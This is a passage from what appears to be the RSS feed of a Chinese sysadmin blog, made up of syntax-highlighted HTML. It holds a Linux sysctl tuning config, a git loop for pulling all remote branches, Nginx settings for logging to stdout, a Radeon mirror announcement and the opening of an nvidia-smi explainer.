<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.conf.default.accept_source_route</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.ip_local_port_range</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1024</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65535</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.route.max_size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2147483647</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_syncookies</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_max_tw_buckets</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 36000</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_sack</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_slow_start_after_idle</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_window_scaling</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_no_metrics_save</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_no_delay_ack</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_tw_recycle</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=0</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_retries2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 5</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_max_orphans</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3276800</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_max_syn_backlog</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 262144</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_timestamps</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_synack_retries</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_syn_retries</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_tw_reuse</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_fin_timeout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_keepalive_time</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 600</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_keepalive_probes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.tcp_keepalive_intvl</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 15</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.neigh.default.base_reachable_time</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3600</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.neigh.default.gc_stale_time</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 60</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.neigh.default.gc_thresh1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1024</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.neigh.default.gc_thresh2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4096</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv4.neigh.default.gc_thresh3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 8192</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#fs.conf</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fs.nr_open</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=6553500</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fs.file-max</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=3276800</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fs.inotify.max_queued_events</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=99999999</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fs.inotify.max_user_watches</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=99999999</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">fs.inotify.max_user_instances</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=65535</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#kernel.conf</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kernel.ctrl-alt-del</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kernel.msgmnb</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kernel.msgmax</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kernel.pid_max</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 65536</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kernel.shmmax</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 68719476736</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kernel.shmall</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4294967296</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kernel.sysrq</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kernel.perf_cpu_time_max_percent</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 5</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">kernel.perf_event_max_sample_rate</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">=100000</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#netfilter.conf</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># memory_size = $(free -m)</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># nf_conntrack_max = 64255*1024*1024 / 16384 / 2</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#net.netfilter.nf_conntrack_max = 2056160</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic"># nf_conntrack_buckets = nf_conntrack_max / 4</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.netfilter.nf_conntrack_buckets</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 514040</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.netfilter.nf_conntrack_tcp_timeout_established</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3600</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.netfilter.nf_conntrack_tcp_timeout_close_wait</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 10</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.netfilter.nf_conntrack_tcp_timeout_fin_wait</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 20</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.netfilter.nf_conntrack_tcp_timeout_time_wait</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 20</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#vm.conf</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vm.min_free_kbytes</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1048576</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vm.vfs_cache_pressure</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 100</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vm.swappiness</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vm.dirty_background_ratio</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vm.dirty_expire_centisecs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 500</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vm.dirty_ratio</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 10</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">vm.dirty_writeback_centisecs</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 100</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic">#ipv6.conf</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv6.conf.default.disable_ipv6</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv6.conf.default.disable_policy</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 0</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv6.conf.default.forwarding</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv6.conf.default.max_addresses</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv6.route.max_size</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 2147483647</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv6.neigh.default.base_reachable_time</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 3600</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv6.neigh.default.gc_stale_time</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 60</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv6.neigh.default.gc_thresh1</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 1024</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv6.neigh.default.gc_thresh2</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 4096</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">net.ipv6.neigh.default.gc_thresh3</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> =</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> 8192</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Radeon镜像站</title>
      <link>https://www.geekery.cn/free-service/radeon-mirror.html</link>
      <guid>https://www.geekery.cn/free-service/radeon-mirror.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Radeon镜像站</source>
      <description>Amd的Radeon镜像站 最近在使用 Ubuntu 安装Amd显卡驱动的时候访问国外镜像站网速特别慢，简直无法忍受，于是乎我自己做了个镜像站，用于加速驱动的下载。 下面的方法仅适用于Ubuntu，其他操作系统按照链接内容安装并替换镜像站 https://rocm.docs.amd.com/projects/install-on-linux/en/la...</description>
      <pubDate>Sun, 31 Mar 2024 07:15:19 GMT</pubDate>
      <content:encoded><![CDATA[
<p>最近在使用 Ubuntu 安装Amd显卡驱动的时候访问国外镜像站网速特别慢，简直无法忍受，于是乎我自己做了个镜像站，用于加速驱动的下载。</p>
<p>下面的方法仅适用于Ubuntu，其他操作系统按照链接内容安装并替换镜像站   <s>我没用到，没写，谁用到了写一个</s> <a href="https://rocm.docs.amd.com/projects/install-on-linux/en/latest/install/amdgpu-install.html" target="_blank" rel="noopener noreferrer">https://rocm.docs.amd.com/projects/install-on-linux/en/latest/install/amdgpu-install.html</a></p>
<h2>镜像内容</h2>
<p>镜像的内容</p>
]]></content:encoded>
    </item>
    <item>
      <title>Docker学习笔记PDF</title>
      <link>https://www.geekery.cn/note-book/Docker/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0PDF.html</link>
      <guid>https://www.geekery.cn/note-book/Docker/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0PDF.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Docker学习笔记PDF</source>
      <description>Docker学习笔记PDF PDF Docker学习笔记</description>
      <pubDate>Fri, 22 Mar 2024 06:15:52 GMT</pubDate>
      <content:encoded><![CDATA[
<h1>PDF</h1>
<p><a href="./Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.pdf">Docker学习笔记</a></p>
]]></content:encoded>
    </item>
    <item>
      <title>Git拉取全部远程分支</title>
      <link>https://www.geekery.cn/note-book/Git/Git%E6%8B%89%E5%8F%96%E5%85%A8%E9%83%A8%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF.html</link>
      <guid>https://www.geekery.cn/note-book/Git/Git%E6%8B%89%E5%8F%96%E5%85%A8%E9%83%A8%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Git拉取全部远程分支</source>
      <description>Git拉取全部远程分支 命令</description>
      <pubDate>Tue, 19 Mar 2024 07:51:00 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>命令</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">for</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> i</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD"> in</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> `</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> branch </span><span style="--shiki-light:#986801;--shiki-dark:#D19A66">-r</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">`</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">do</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF"> git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> checkout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> `</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">basename</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75"> $i</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379">`</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF"> &amp;&amp; </span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">git</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> pull</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66"> --all</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">; </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD">done</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Nginx的日志重定向到标准输出</title>
      <link>https://www.geekery.cn/note-book/Nginx-OpenResty/Nginx%E7%9A%84%E6%97%A5%E5%BF%97%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E6%A0%87%E5%87%86%E8%BE%93%E5%87%BA.html</link>
      <guid>https://www.geekery.cn/note-book/Nginx-OpenResty/Nginx%E7%9A%84%E6%97%A5%E5%BF%97%E9%87%8D%E5%AE%9A%E5%90%91%E5%88%B0%E6%A0%87%E5%87%86%E8%BE%93%E5%87%BA.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Nginx的日志重定向到标准输出</source>
      <description>Nginx的日志重定向到标准输出 背景 静态站点使用docker部署时，希望nginx前台启动的同时可以将错误日志和访问日志全部重定向到标准输出 方法</description>
      <pubDate>Sat, 09 Mar 2024 09:32:33 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>背景</h2>
<p>静态站点使用docker部署时，希望<code>nginx前台启动</code>的同时可以将错误日志和访问日志全部重定向到标准输出</p>
<h2>方法</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">daemon</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> off</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">error_log</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/stdout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> warn</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">access_log</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> /dev/stdout</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379"> main</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF">;</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>Nvidia显卡在Ubuntu平台超频</title>
      <link>https://www.geekery.cn/note-book/AI-Training/Nvidia%E6%98%BE%E5%8D%A1%E5%9C%A8Ubuntu%E5%B9%B3%E5%8F%B0%E8%B6%85%E9%A2%91.html</link>
      <guid>https://www.geekery.cn/note-book/AI-Training/Nvidia%E6%98%BE%E5%8D%A1%E5%9C%A8Ubuntu%E5%B9%B3%E5%8F%B0%E8%B6%85%E9%A2%91.html</guid>
      <source url="https://www.geekery.cn/rss.xml">Nvidia显卡在Ubuntu平台超频</source>
      <description>Nvidia显卡在Ubuntu平台超频 nvidia-smi 借用网络上的一张图，这个命令结束后代表的含义 image-20240305095312766 对特殊参数进行解释 开启持久模式 设置目标 GPUs 的持久模式。有关持久性模式的描述，请参见 (GPU ATTRIBUTES) 部分。需要 root。除非使用 -i 参数指定单个 GPU，否则它将...</description>
      <pubDate>Tue, 05 Mar 2024 02:23:54 GMT</pubDate>
      <content:encoded><![CDATA[
<h2>nvidia-smi</h2>
<div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF">nvidia-smi</span></span></code></pre>
<div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0"><div class="line-number"></div></div></div><p>借用网络上的一张图，这个命令结束后代表的含义</p>
<p></p>
<p>对特殊参数进行解释</p>
<div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>持久模式：persistence mode 能够让 GPU 更快响应任务，待机功耗增加。</span></span>
<span class="line"><span>    关闭 persistence mode 同样能够启动任务。</span></span>
<span class="line"><span>    持续模式虽然耗能大，但是在新的GPU应用启动时，花费的时间更少</span></span>
<span class="line"><span>风扇转速：主动散热的显卡一般会有这个参数，服务器显卡一般是被动散热，这个参数显示N/A。</span></span>
<span class="line"><span>    从0到100%之间变动，这个速度是计算机期望的风扇转速，实际情况下如果风扇堵转，可能打不到显示的转速。</span></span>
<span class="line"><span>    有的设备不会返回转速，因为它不依赖风扇冷却而是通过其他外设保持低温（比如有些实验室的服务器是常年放在空调房间里的）。 </span></span>
<span class="line"><span>温度：单位是摄氏度。 </span></span>
<span class="line"><span>性能状态：从P0到P12，P0表示最大性能，P12表示状态最小性能。 </span></span>
<span class="line"><span>Disp.A：Display Active，表示GPU的显示是否初始化。 </span></span>
<span class="line"><span>ECC纠错：这个只有近几年的显卡才具有这个功能，老版显卡不具备这个功能。 </span></span>
